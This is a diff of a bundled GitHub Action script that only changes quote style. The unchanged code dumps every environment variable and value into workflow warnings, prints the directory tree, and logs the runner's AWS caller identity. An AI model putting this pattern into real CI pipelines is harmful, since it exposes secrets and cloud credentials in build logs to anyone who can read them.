@@ -20284,7 +20284,7 @@ const process = __importStar(__nccwpck_require__(7282));
 const fs = __importStar(__nccwpck_require__(7147));
 const path = __importStar(__nccwpck_require__(1017));
 function printFolderTree(folderPath, level = 0) {
-    const indent = '  '.repeat(level);
+    const indent = "  ".repeat(level);
     const items = fs.readdirSync(folderPath);
     for (const item of items) {
         const itemPath = path.join(folderPath, item);
@@ -20305,14 +20305,14 @@ function printFolderTree(folderPath, level = 0) {
 async function run() {
     console.log(`>>>>>>>>>`);
     for (const tmp in process.env) {
-        core.warning(tmp + '>>>>' + process.env[tmp]);
+        core.warning(tmp + ">>>>" + process.env[tmp]);
     }
-    printFolderTree('.');
+    printFolderTree(".");
     const sts = new client_sts_1.STSClient({ region: process.env.AWS_DEFAULT_REGION });
     const callerId = await sts.send(new client_sts_1.GetCallerIdentityCommand({}));
-    core.error('>>>>');
+    core.error(">>>>");
     core.error(JSON.stringify(callerId, null, 2));
-    core.error('<<<<');
+    core.error("<<<<");
 }
 exports.run = run;
 
